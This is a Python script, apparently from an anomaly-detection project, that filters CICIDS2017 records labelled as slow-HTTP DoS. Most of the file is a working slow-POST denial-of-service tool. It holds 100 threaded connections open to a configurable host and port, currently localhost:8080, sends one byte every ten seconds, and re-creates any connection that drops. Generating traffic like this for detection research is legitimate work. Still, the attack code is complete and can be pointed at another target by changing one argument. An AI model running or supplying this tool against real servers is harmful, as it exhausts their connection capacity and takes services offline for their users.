import socket
import time
import threading
import pandas as pd

# List of columns to be read from the CSV file
COLUMNS = [
    "Destination Port", "Flow Duration", "Total Fwd Packets", "Total Backward Packets", 
    "Total Length of Fwd Packets", "Total Length of Bwd Packets", "Fwd Packet Length Max", 
    "Fwd Packet Length Min", "Fwd Packet Length Mean", "Fwd Packet Length Std", 
    "Bwd Packet Length Max", "Bwd Packet Length Min", "Bwd Packet Length Mean", 
    "Bwd Packet Length Std", "Flow Bytes/s", "Flow Packets/s", "Flow IAT Mean", 
    "Flow IAT Std", "Flow IAT Max", "Flow IAT Min", "Fwd IAT Total", "Fwd IAT Mean", 
    "Fwd IAT Std", "Fwd IAT Max", "Fwd IAT Min", "Bwd IAT Total", "Bwd IAT Mean", 
    "Bwd IAT Std", "Bwd IAT Max", "Bwd IAT Min", "Fwd PSH Flags", "Bwd PSH Flags", 
    "Fwd URG Flags", "Bwd URG Flags", "Fwd Header Length", "Bwd Header Length", 
    "Fwd Packets/s", "Bwd Packets/s", "Min Packet Length", "Max Packet Length", 
    "Packet Length Mean", "Packet Length Std", "Packet Length Variance", "FIN Flag Count", 
    "SYN Flag Count", "RST Flag Count", "PSH Flag Count", "ACK Flag Count", "URG Flag Count", 
    "CWE Flag Count", "ECE Flag Count", "Down/Up Ratio", "Average Packet Size", 
    "Avg Fwd Segment Size", "Avg Bwd Segment Size", "Fwd Header Length.1", "Fwd Avg Bytes/Bulk", 
    "Fwd Avg Packets/Bulk", "Fwd Avg Bulk Rate", "Bwd Avg Bytes/Bulk", "Bwd Avg Packets/Bulk", 
    "Bwd Avg Bulk Rate", "Subflow Fwd Packets", "Subflow Fwd Bytes", "Subflow Bwd Packets", 
    "Subflow Bwd Bytes", "Init_Win_bytes_forward", "Init_Win_bytes_backward", "act_data_pkt_fwd", 
    "min_seg_size_forward", "Active Mean", "Active Std", "Active Max", "Active Min", "Idle Mean", 
    "Idle Std", "Idle Max", "Idle Min", "Flow Bytes/s * Flow Duration", 
    "Total Length of Fwd Packets * Total Length of Bwd Packets", "Fwd Packets/s * Bwd Packets/s", 
    "Flow Duration^2", "Flow Duration^3", "Mean Packet Length", "Std Packet Length", 
    "Flow Duration / Total Fwd Packets", "Flow Duration / Total Backward Packets", 
    "Total Fwd Packets / Total Backward Packets", "Fwd Packets/s / Bwd Packets/s", 
    "Flow Bytes/s / Flow Packets/s", "Label", "Protocol"
]

# Specific file path
DATA_FILE = r"E:/CloudAnomalyDetectionSystem/data/train/Wednesday-workingHours.pcap_ISCX.csv"

def load_dos_slowhttptest_data(file_path):
    """
    Reads the specified CSV file, selects the defined columns,
    and filters rows where Label == 'DoS_Slowhttptest'.
    """
    try:
        df = pd.read_csv(file_path, usecols=lambda col: col in COLUMNS, low_memory=False)
        df = df.apply(pd.to_numeric, errors='coerce').dropna()  # Convert to numeric and drop NaNs
        slowhttptest_df = df[df["Label"] == "DoS Slowhttptest"]
        return slowhttptest_df
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        return pd.DataFrame()

class SlowHTTPTest:
    def __init__(self, target_host="127.0.0.1", target_port=8080, num_connections=100):
        self.target_host = target_host
        self.target_port = target_port
        self.num_connections = num_connections
        self.connections = []
        self.running = True

    def create_socket(self):
        """Creates a new socket and initiates a slow HTTP request."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target_host, self.target_port))
            
            post_request = (
                f"POST /submit HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 1000\r\n"
                "\r\n"
            )
            
            sock.send(post_request.encode())
            return sock
        except socket.error as e:
            print(f"Failed to create connection: {e}")
            return None

    def maintain_connection(self, sock):
        """Maintains the connection by sending data very slowly."""
        try:
            while self.running:
                sock.send(b"X")
                time.sleep(10)  # Wait 10 seconds before sending next byte
        except socket.error:
            if sock in self.connections:
                self.connections.remove(sock)
            sock.close()

    def start_attack(self):
        """Starts the Slow HTTP Test attack."""
        print(f"Starting Slow HTTP Test attack on {self.target_host}:{self.target_port}")
        
        try:
            for i in range(self.num_connections):
                sock = self.create_socket()
                if sock:
                    self.connections.append(sock)
                    thread = threading.Thread(target=self.maintain_connection, args=(sock,))
                    thread.daemon = True
                    thread.start()
                    print(f"Created connection {i + 1}")
                time.sleep(0.1)

            while True:
                current_connections = len(self.connections)
                print(f"Active connections: {current_connections}")
                
                while len(self.connections) < self.num_connections:
                    sock = self.create_socket()
                    if sock:
                        self.connections.append(sock)
                        thread = threading.Thread(target=self.maintain_connection, args=(sock,))
                        thread.daemon = True
                        thread.start()
                        print("Recreated dead connection")
                time.sleep(5)

        except KeyboardInterrupt:
            print("\nSlow HTTP Test attack stopped by user")
            self.stop_attack()

    def stop_attack(self):
        """Stops the attack and cleans up connections."""
        self.running = False
        for sock in self.connections:
            try:
                sock.close()
            except:
                pass
        self.connections.clear()

def main():
    # Load and filter data for DoS_Slowhttptest records
    slowhttptest_data = load_dos_slowhttptest_data(DATA_FILE)
    if slowhttptest_data.empty:
        print("No records labeled 'DoS_Slowhttptest' found in the provided file.")
    else:
        print(f"Total DoS_Slowhttptest records found: {len(slowhttptest_data)}")
    
    # Fixed target port 8080
    target_port = 8080
    
    # Initialize and start the attack
    attack = SlowHTTPTest(target_host="127.0.0.1", target_port=target_port, num_connections=100)
    attack.start_attack()

if __name__ == "__main__":
    main()
